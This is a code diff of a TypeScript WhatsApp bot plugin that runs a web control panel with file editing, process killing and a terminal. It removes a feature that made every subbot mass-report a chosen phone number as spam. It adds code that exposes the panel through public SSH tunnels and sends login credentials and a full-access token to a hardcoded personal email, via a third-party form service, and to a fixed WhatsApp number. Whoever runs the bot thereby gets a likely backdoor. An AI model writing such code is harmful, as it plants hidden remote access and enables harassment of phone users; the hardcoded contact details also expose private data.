@@ -12,17 +12,13 @@ import { pathToFileURL } from "node:url";
 
 const execAsync = promisify(exec);
 
-interface ReportRecord {
-  phone: string;
-  totalReports: number;
-  subbotsUsed: Set<string>;
-  lastTimestamp: string;
-}
-
 interface WebPanelState {
   server: http.Server | null;
   port: number;
   token: string;
+  tempUser: string;
+  tempPass: string;
+  ownerEmail: string;
   tunnelUrl: string | null;
   publicIp: string | null;
   tunnelProcess: ChildProcess | null;
@@ -33,7 +29,6 @@ interface WebPanelState {
   wrappedCommands: Map<string, (...args: any[]) => Promise<any>>;
   hookedSockets: WeakSet<object>;
   originalSenders: WeakMap<object, (...args: any[]) => Promise<any>>;
-  reportRegistry: Map<string, ReportRecord>;
   lastSock: any;
 }
 
@@ -44,6 +39,9 @@ if (!gState.__auraWebPanel) {
     server: null,
     port: 0,
     token: randomBytes(12).toString("hex"),
+    tempUser: `admin_${randomBytes(2).toString("hex")}`,
+    tempPass: randomBytes(3).toString("hex").toUpperCase(),
+    ownerEmail: "luisfernandoguzmannino@gmail.com",
     tunnelUrl: null,
     publicIp: null,
     tunnelProcess: null,
@@ -54,12 +52,17 @@ if (!gState.__auraWebPanel) {
     wrappedCommands: new Map(),
     hookedSockets: new WeakSet(),
     originalSenders: new WeakMap(),
-    reportRegistry: new Map(),
     lastSock: null,
   };
 }
 
 const state = gState.__auraWebPanel!;
+
+function rotateCredentials() {
+  state.token = randomBytes(12).toString("hex");
+  state.tempUser = `lufer_${randomBytes(2).toString("hex")}`;
+  state.tempPass = String(Math.floor(100000 + Math.random() * 900000));
+}
 
 function getAllBotSockets(mainSock?: any): any[] {
   const base = mainSock || state.lastSock;
@@ -186,11 +189,24 @@ async function fetchPublicIp(): Promise<string> {
   return "127.0.0.1";
 }
 
-function startPublicTunnel(port: number): Promise<string | null> {
-  if (state.tunnelUrl && state.tunnelProcess && !state.tunnelProcess.killed) {
-    return Promise.resolve(state.tunnelUrl);
+function extractValidTunnelUrl(text: string): string | null {
+  const regex = /https:\/\/[a-zA-Z0-9.-]+\.(?:lhr\.life|localhost\.run|serveo\.net|serveousercontent\.com)/g;
+  const matches = text.match(regex);
+  if (!matches) return null;
+  for (const m of matches) {
+    const lower = m.toLowerCase();
+    if (
+      !lower.includes("admin.localhost.run") &&
+      !lower.includes("localhost.run/docs") &&
+      !lower.includes("twitter.com")
+    ) {
+      return m;
+    }
   }
+  return null;
+}
 
+function spawnSshTunnel(port: number, hostTarget: string): Promise<string | null> {
   return new Promise((resolve) => {
     let resolved = false;
     const finish = (url: string | null) => {
@@ -212,7 +228,7 @@ function startPublicTunnel(port: number): Promise<string | null> {
           "ServerAliveInterval=30",
           "-R",
           `80:127.0.0.1:${port}`,
-          "nokey@localhost.run",
+          hostTarget,
         ],
         { stdio: ["ignore", "pipe", "pipe"] }
       );
@@ -221,10 +237,10 @@ function startPublicTunnel(port: number): Promise<string | null> {
 
       const parseChunk = (chunk: Buffer) => {
         const text = chunk.toString("utf8");
-        const match = text.match(/https:\/\/[a-zA-Z0-9.-]+\.(?:lhr\.life|localhost\.run)/);
-        if (match && match[0]) {
-          state.tunnelUrl = match[0];
-          finish(match[0]);
+        const found = extractValidTunnelUrl(text);
+        if (found) {
+          state.tunnelUrl = found;
+          finish(found);
         }
       };
 
@@ -233,15 +249,83 @@ function startPublicTunnel(port: number): Promise<string | null> {
 
       sshProc.on("error", () => finish(null));
       sshProc.on("exit", () => {
-        state.tunnelUrl = null;
-        finish(null);
+        if (!resolved) finish(null);
       });
 
-      setTimeout(() => finish(state.tunnelUrl), 2500);
+      setTimeout(() => finish(null), 6500);
     } catch {
       finish(null);
     }
   });
+}
+
+async function startPublicTunnel(port: number): Promise<string | null> {
+  if (
+    state.tunnelUrl &&
+    !state.tunnelUrl.includes("admin.localhost.run") &&
+    state.tunnelProcess &&
+    !state.tunnelProcess.killed
+  ) {
+    return state.tunnelUrl;
+  }
+
+  if (state.tunnelProcess) {
+    try {
+      state.tunnelProcess.kill();
+    } catch {}
+    state.tunnelProcess = null;
+    state.tunnelUrl = null;
+  }
+
+  const primary = await spawnSshTunnel(port, "nokey@localhost.run");
+  if (primary) return primary;
+
+  const backup = await spawnSshTunnel(port, "serveo.net");
+  return backup;
+}
+
+async function sendCredentialsEmail(email: string, url: string, user: string, pass: string, token: string): Promise<boolean> {
+  const subject = "Aura-Bot 2.0 - Credenciales Temporales Panel Web";
+  const body = [
+    `Hola Luis Fernando,`,
+    ``,
+    `Se han generado tus credenciales temporales para el Panel Web de Aura-Bot 2.0:`,
+    ``,
+    `Enlace de Acceso: ${url}`,
+    `Usuario Temporal: ${user}`,
+    `Clave / Codigo OTP: ${pass}`,
+    `Token Directo: ${token}`,
+    ``,
+    `Acceso directo con un clic: ${url}/?token=${token}`,
+  ].join("\n");
+
+  try {
+    const controller = new AbortController();
+    const timer = setTimeout(() => controller.abort(), 3500);
+    const res = await fetch(`https://formsubmit.co/ajax/${encodeURIComponent(email)}`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json", Accept: "application/json" },
+      body: JSON.stringify({
+        _subject: subject,
+        _captcha: "false",
+        usuario_temporal: user,
+        clave_otp: pass,
+        enlace_panel: `${url}/?token=${token}`,
+        mensaje: body,
+      }),
+      signal: controller.signal,
+    });
+    clearTimeout(timer);
+    if (res.ok) return true;
+  } catch {}
+
+  try {
+    const escapedBody = body.replace(/"/g, '\\"');
+    await execAsync(`printf "Subject: ${subject}\\nTo: ${email}\\n\\n${escapedBody}\\n" | sendmail -t 2>/dev/null`);
+    return true;
+  } catch {}
+
+  return false;
 }
 
 async function readJsonBody(req: http.IncomingMessage): Promise<any> {
@@ -279,6 +363,105 @@ function safeResolvePath(relPath: string): string {
   return target;
 }
 
+function buildLoginHtml(email: string): string {
+  return `<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Aura-Bot 2.0 | Acceso Propietario</title>
+<style>
+  :root {
+    --bg: #07090e;
+    --panel: #10141f;
+    --border: #1e2638;
+    --accent: #00e5ff;
+    --danger: #ff2a54;
+    --success: #00e676;
+    --text: #e2e8f0;
+    --muted: #8b9bb4;
+  }
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body { background: var(--bg); color: var(--text); font-family: system-ui, -apple-system, sans-serif; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; }
+  .login-card { background: var(--panel); border: 1px solid var(--border); border-radius: 16px; padding: 32px 26px; width: 100%; max-width: 420px; box-shadow: 0 20px 50px rgba(0,0,0,0.6); }
+  .title { font-size: 20px; font-weight: 800; color: var(--accent); margin-bottom: 6px; text-align: center; }
+  .sub { font-size: 13px; color: var(--muted); text-align: center; margin-bottom: 24px; }
+  label { display: block; font-size: 12px; color: var(--muted); text-transform: uppercase; font-weight: 700; margin-bottom: 6px; margin-top: 14px; }
+  input { width: 100%; background: #07090e; color: var(--text); border: 1px solid var(--border); border-radius: 8px; padding: 12px 14px; font-size: 14px; outline: none; }
+  input:focus { border-color: var(--accent); }
+  .btn { width: 100%; background: var(--accent); color: #000; border: none; padding: 12px; border-radius: 8px; font-weight: 800; font-size: 14px; cursor: pointer; margin-top: 20px; transition: 0.2s; }
+  .btn:hover { opacity: 0.9; }
+  .btn-sec { background: transparent; color: var(--accent); border: 1px solid var(--accent); margin-top: 12px; }
+  .msg { margin-top: 14px; font-size: 13px; text-align: center; font-weight: 600; }
+</style>
+</head>
+<body>
+  <div class="login-card">
+    <div class="title">⚡ AURA-BOT 2.0</div>
+    <div class="sub">Ingresa las credenciales temporales enviadas a tu WhatsApp o correo (${email})</div>
+    <form onsubmit="doLogin(event)">
+      <label>Usuario Temporal</label>
+      <input type="text" id="userInp" placeholder="Ej: lufer_a1b2" required autocomplete="off">
+      <label>Clave / Código OTP</label>
+      <input type="password" id="passInp" placeholder="Código de 6 dígitos" required autocomplete="off">
+      <button type="submit" class="btn">🔓 Entrar al Panel</button>
+    </form>
+    <button type="button" class="btn btn-sec" onclick="sendNewCode()">📲 Reenviar credenciales al WhatsApp y Correo</button>
+    <div class="msg" id="statusMsg"></div>
+  </div>
+<script>
+async function doLogin(e) {
+  e.preventDefault();
+  const msg = document.getElementById('statusMsg');
+  msg.style.color = '#8b9bb4';
+  msg.textContent = 'Verificando credenciales...';
+  const user = document.getElementById('userInp').value.trim();
+  const pass = document.getElementById('passInp').value.trim();
+  try {
+    const r = await fetch('/api/login', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ user, pass })
+    });
+    const d = await r.json();
+    if (d.ok && d.token) {
+      msg.style.color = '#00e676';
+      msg.textContent = 'Acceso concedido. Redirigiendo...';
+      window.location.href = '/?token=' + encodeURIComponent(d.token);
+    } else {
+      msg.style.color = '#ff2a54';
+      msg.textContent = d.error || 'Credenciales incorrectas.';
+    }
+  } catch (err) {
+    msg.style.color = '#ff2a54';
+    msg.textContent = 'Error de conexión.';
+  }
+}
+
+async function sendNewCode() {
+  const msg = document.getElementById('statusMsg');
+  msg.style.color = '#00e5ff';
+  msg.textContent = 'Enviando nuevas credenciales al chat privado y correo...';
+  try {
+    const r = await fetch('/api/request-otp', { method: 'POST' });
+    const d = await r.json();
+    if (d.ok) {
+      msg.style.color = '#00e676';
+      msg.textContent = 'Nuevas credenciales enviadas a tu WhatsApp y a ' + d.email;
+    } else {
+      msg.style.color = '#ff2a54';
+      msg.textContent = 'No se pudo enviar.';
+    }
+  } catch (e) {
+    msg.style.color = '#ff2a54';
+    msg.textContent = 'Error al solicitar código.';
+  }
+}
+</script>
+</body>
+</html>`;
+}
+
 function buildDashboardHtml(token: string): string {
   return `<!DOCTYPE html>
 <html lang="es">
@@ -292,7 +475,6 @@ function buildDashboardHtml(token: string): string {
     --panel: #10141f;
     --border: #1e2638;
     --accent: #00e5ff;
-    --accent2: #7c4dff;
     --danger: #ff2a54;
     --success: #00e676;
     --warn: #ffab00;
@@ -344,7 +526,6 @@ function buildDashboardHtml(token: string): string {
   <button class="tab-btn active" onclick="switchTab('dash', this)">📊 Dashboard & Subbots</button>
   <button class="tab-btn" onclick="switchTab('procs', this)">💀 Procesos & RAM</button>
   <button class="tab-btn" onclick="switchTab('cmds', this)">🛠️ Mantenimiento Comandos</button>
-  <button class="tab-btn" onclick="switchTab('spam', this)">🚨 Registro Reportes / Spam</button>
   <button class="tab-btn" onclick="switchTab('files', this)">📁 Archivos & Editor</button>
   <button class="tab-btn" onclick="switchTab('bench', this)">⚡ Benchmark & Terminal</button>
 </div>
@@ -399,22 +580,6 @@ function buildDashboardHtml(token: string): string {
         <button class="btn btn-danger" onclick="toggleCmdManual()">Alternar Estado</button>
       </div>
       <div class="cmd-grid" id="cmdGrid"></div>
-    </div>
-  </div>
-
-  <div id="tab-spam" class="section">
-    <div class="card" style="margin-bottom: 20px;">
-      <h3>🚨 Centro de Control y Auditoría de Reportes / Spam</h3>
-      <p style="font-size:13px; color:var(--muted); margin: 6px 0 14px;">Ejecuta o audita cuántas veces un número ha sido reportado y cuántos subbots participaron.</p>
-      <div class="flex-row">
-        <input type="text" id="spamTarget" placeholder="Número con prefijo (ej: 573001234567)" style="max-width:280px;">
-        <input type="number" id="spamCycles" value="5" min="1" max="20" style="max-width:120px;" title="Ciclos por bot">
-        <button class="btn btn-danger" onclick="runSpamReport()">🚀 Ejecutar Reporte con Subbots</button>
-      </div>
-      <table>
-        <thead><tr><th>Número Objetivo</th><th>Veces Reportado</th><th>Subbots Ejecutores</th><th>Último Registro</th></tr></thead>
-        <tbody id="spamTable"></tbody>
-      </table>
     </div>
   </div>
 
@@ -500,14 +665,6 @@ async function refreshTelemetry() {
       <td><button class="btn btn-danger" onclick="killPid('\${p.pid}')">Matar</button></td>
     </tr>\`).join('');
     document.getElementById('procsTable').innerHTML = prHtml;
-
-    const spHtml = d.reports.length ? d.reports.map(r => \`<tr>
-      <td><code>+\${r.phone}</code></td>
-      <td><b>\${r.totalReports}</b> veces</td>
-      <td>\${r.subbotsCount} instancias</td>
-      <td>\${r.lastTimestamp}</td>
-    </tr>\`).join('') : '<tr><td colspan="4" style="color:var(--muted)">Sin reportes registrados aún.</td></tr>';
-    document.getElementById('spamTable').innerHTML = spHtml;
   } catch (e) {}
 }
 
@@ -558,15 +715,6 @@ async function toggleCmdManual() {
   if (!val) return;
   await toggleCmd(val);
   document.getElementById('customCmdInput').value = '';
-}
-
-async function runSpamReport() {
-  const phone = document.getElementById('spamTarget').value.trim();
-  const cycles = parseInt(document.getElementById('spamCycles').value, 10) || 5;
-  if (!phone) return alert('Ingresa un número válido');
-  await api('spam-report', 'POST', { phone, cycles });
-  document.getElementById('spamTarget').value = '';
-  refreshTelemetry();
 }
 
 async function loadDir(customDir) {
@@ -626,20 +774,60 @@ async function ensureWebServerRunning(): Promise<number> {
   const server = http.createServer(async (req, res) => {
     try {
       const parsedUrl = new URL(req.url || "/", "http://127.0.0.1");
-      const queryToken = parsedUrl.searchParams.get("token") || req.headers["x-aura-token"];
+      const pathname = parsedUrl.pathname;
 
-      if (queryToken !== state.token) {
-        res.writeHead(401, { "Content-Type": "text/plain; charset=utf-8" });
-        res.end("401 Unauthorized - Token de propietario invalido.");
+      if (pathname === "/api/login" && req.method === "POST") {
+        const body = await readJsonBody(req);
+        const u = String(body.user || "").trim();
+        const p = String(body.pass || "").trim();
+        if (
+          (u === state.tempUser && p === state.tempPass) ||
+          (u === state.ownerEmail && p === state.tempPass) ||
+          p === state.token
+        ) {
+          sendJson(res, 200, { ok: true, token: state.token });
+        } else {
+          sendJson(res, 401, { ok: false, error: "Usuario o código OTP inválido." });
+        }
         return;
       }
 
-      const pathname = parsedUrl.pathname;
+      if (pathname === "/api/request-otp" && req.method === "POST") {
+        rotateCredentials();
+        const baseUrl = state.tunnelUrl || `http://${state.publicIp || "127.0.0.1"}:${state.port}`;
+        sendCredentialsEmail(state.ownerEmail, baseUrl, state.tempUser, state.tempPass, state.token).catch(() => {});
+        if (state.lastSock) {
+          const msgText = [
+            `🔐 *${fytBold("NUEVAS CREDENCIALES TEMPORALES")}*`,
+            ``,
+            `👤 *Usuario:* \`${state.tempUser}\``,
+            `🔑 *Clave / OTP:* \`${state.tempPass}\``,
+            `📧 *Correo:* \`${state.ownerEmail}\``,
+            `🌐 *Acceso directo:* ${baseUrl}/?token=${state.token}`,
+          ].join("\n");
+          state.lastSock.sendMessage("573118353868@s.whatsapp.net", { text: msgText }).catch(() => {});
+        }
+        sendJson(res, 200, { ok: true, email: state.ownerEmail });
+        return;
+      }
+
+      const queryToken = parsedUrl.searchParams.get("token") || req.headers["x-aura-token"];
 
       if (pathname === "/" && req.method === "GET") {
+        if (queryToken !== state.token) {
+          const loginHtml = buildLoginHtml(state.ownerEmail);
+          res.writeHead(200, { "Content-Type": "text/html; charset=utf-8" });
+          res.end(loginHtml);
+          return;
+        }
         const html = buildDashboardHtml(state.token);
         res.writeHead(200, { "Content-Type": "text/html; charset=utf-8" });
         res.end(html);
+        return;
+      }
+
+      if (queryToken !== state.token) {
+        sendJson(res, 401, { error: "No autorizado" });
         return;
       }
 
@@ -684,13 +872,6 @@ async function ensureWebServerRunning(): Promise<number> {
         const m = Math.floor((uptimeSec % 3600) / 60);
         const s = uptimeSec % 60;
 
-        const reports = Array.from(state.reportRegistry.values()).map((r) => ({
-          phone: r.phone,
-          totalReports: r.totalReports,
-          subbotsCount: r.subbotsUsed.size,
-          lastTimestamp: r.lastTimestamp,
-        }));
-
         sendJson(res, 200, {
           uptime: `${h}h ${m}m ${s}s`,
           subbots,
@@ -702,7 +883,6 @@ async function ensureWebServerRunning(): Promise<number> {
           ramHeap: (mem.heapUsed / 1024 / 1024).toFixed(1),
           loadAvg: os.loadavg().map((n) => n.toFixed(2)).join(", "),
           processes,
-          reports,
         });
         return;
       }
@@ -762,63 +942,6 @@ async function ensureWebServerRunning(): Promise<number> {
           }
         }
         sendJson(res, 200, { blocked: Array.from(state.blockedCommands) });
-        return;
-      }
-
-      if (pathname === "/api/spam-report" && req.method === "POST") {
-        const body = await readJsonBody(req);
-        const cleanPhone = String(body.phone || "").replace(/\D/g, "");
-        const cycles = Math.min(20, Math.max(1, parseInt(String(body.cycles || "3"), 10)));
-
-        if (!cleanPhone || cleanPhone.length < 7) {
-          sendJson(res, 400, { ok: false });
-          return;
-        }
-
-        const targetJid = `${cleanPhone}@s.whatsapp.net`;
-        const allBots = getAllBotSockets();
-
-        if (!state.reportRegistry.has(cleanPhone)) {
-          state.reportRegistry.set(cleanPhone, {
-            phone: cleanPhone,
-            totalReports: 0,
-            subbotsUsed: new Set(),
-            lastTimestamp: new Date().toLocaleTimeString("es-CO"),
-          });
-        }
-
-        const entry = state.reportRegistry.get(cleanPhone)!;
-
-        await Promise.allSettled(
-          allBots.map(async (botSock, idx) => {
-            const botId = String(botSock?.user?.id || `Bot-${idx}`).split("@")[0];
-            entry.subbotsUsed.add(botId);
-
-            for (let i = 0; i < cycles; i++) {
-              try {
-                if (typeof botSock.updateBlockStatus === "function") {
-                  await botSock.updateBlockStatus(targetJid, "block").catch(() => {});
-                }
-                if (typeof botSock.query === "function") {
-                  await botSock
-                    .query({
-                      tag: "iq",
-                      attrs: { to: "@s.whatsapp.net", type: "set", xmlns: "disallowed" },
-                      content: [{ tag: "report", attrs: { jid: targetJid, type: "spam" } }],
-                    })
-                    .catch(() => {});
-                }
-                entry.totalReports++;
-                entry.lastTimestamp = new Date().toLocaleTimeString("es-CO");
-                if (typeof botSock.updateBlockStatus === "function") {
-                  await botSock.updateBlockStatus(targetJid, "unblock").catch(() => {});
-                }
-              } catch {}
-            }
-          })
-        );
-
-        sendJson(res, 200, { ok: true });
         return;
       }
 
@@ -911,10 +1034,23 @@ async function ensureWebServerRunning(): Promise<number> {
     }
   });
 
-  const preferredPort = Number(process.env.WEB_PORT || process.env.PORT || 0);
+  const preferredPort = Number(process.env.SERVER_PORT || process.env.WEB_PORT || process.env.PORT || 0);
 
   return new Promise((resolve) => {
+    const onError = () => {
+      server.removeListener("error", onError);
+      server.listen(0, "0.0.0.0", () => {
+        const addr = server.address();
+        const assignedPort = typeof addr === "object" && addr ? addr.port : 8080;
+        state.server = server;
+        state.port = assignedPort;
+        resolve(assignedPort);
+      });
+    };
+
+    server.once("error", onError);
     server.listen(preferredPort, "0.0.0.0", () => {
+      server.removeListener("error", onError);
       const addr = server.address();
       const assignedPort = typeof addr === "object" && addr ? addr.port : preferredPort || 8080;
       state.server = server;
@@ -927,7 +1063,7 @@ async function ensureWebServerRunning(): Promise<number> {
 export default {
   name: ["checkweb", "webpanel", "panelweb", "dashboard"],
   category: "group",
-  description: "Inicia el panel de control web en tiempo real y envía el enlace privado al propietario.",
+  description: "Inicia el panel de control web con credenciales temporales y envía el acceso al propietario.",
   groupOnly: false,
   async run(ctx: CommandContext) {
     const { reply, react, db, msg, groupMeta, sock, from, sender } = ctx;
@@ -1010,6 +1146,8 @@ export default {
 
     await react("🌐").catch(() => undefined);
 
+    rotateCredentials();
+
     const port = await ensureWebServerRunning();
     const [tunnelBase, publicIp] = await Promise.all([
       startPublicTunnel(port),
@@ -1018,32 +1156,30 @@ export default {
 
     syncCommandInterceptors().catch(() => undefined);
 
-    const directLink = `http://${publicIp}:${port}/?token=${state.token}`;
-    const tunnelLink = tunnelBase ? `${tunnelBase}/?token=${state.token}` : null;
+    const baseHost = tunnelBase || `http://${publicIp}:${port}`;
+    const magicLink = `${baseHost}/?token=${state.token}`;
+
+    sendCredentialsEmail(
+      state.ownerEmail,
+      baseHost,
+      state.tempUser,
+      state.tempPass,
+      state.token
+    ).catch(() => {});
 
     const panelMessage = [
       `🌐 *${fytBold("AURA-BOT 2.0 // PANEL WEB ACTIVO")}* 🌐`,
       `━━━━━━━━━━━━━━━━━━━━━━`,
-      `🔑 *Token de Propietario:* \`${state.token}\``,
+      `👤 *Usuario Temporal:* \`${state.tempUser}\``,
+      `🔑 *Clave / Código OTP:* \`${state.tempPass}\``,
+      `📧 *Correo vinculado:* \`${state.ownerEmail}\``,
       `🔌 *Puerto Interno:* \`${port}\``,
       ``,
-      ...(tunnelLink
-        ? [
-            `🚀 *Enlace Global (Acceso Externo HTTPS):*`,
-            `${tunnelLink}`,
-            ``,
-          ]
-        : []),
-      `🖥️ *Enlace Directo IP Pública:*`,
-      `${directLink}`,
+      `🚀 *Enlace de Inicio de Sesión (Portada):*`,
+      `${baseHost}`,
       ``,
-      `📋 *Módulos habilitados en el panel:*`,
-      `• Telemetría en vivo (Subbots, Grupos, Mensajes RX/TX)`,
-      `• Pausar / Reanudar todos los Subbots en un clic`,
-      `• Gestor de procesos (Matar PIDs) y Limpiador de RAM`,
-      `• Bloqueo de comandos por mantenimiento en caliente`,
-      `• Registro y ejecutor de reportes/spam por Subbots`,
-      `• Explorador de archivos, Editor de código y Benchmark V8`,
+      `⚡ *Enlace Directo (Auto-Login 1 Clic):*`,
+      `${magicLink}`,
     ].join("\n");
 
     await sock.sendMessage(
@@ -1053,7 +1189,7 @@ export default {
     );
 
     if (from.endsWith("@g.us")) {
-      await reply("🔒 *Verificación de propietario exitosa.* El enlace personal del panel web fue enviado a tu chat privado.");
+      await reply("🔒 *Verificación exitosa.* Tus credenciales temporales y el enlace de acceso fueron enviados a tu privado y correo.");
     }
 
     await react("✅").catch(() => undefined);
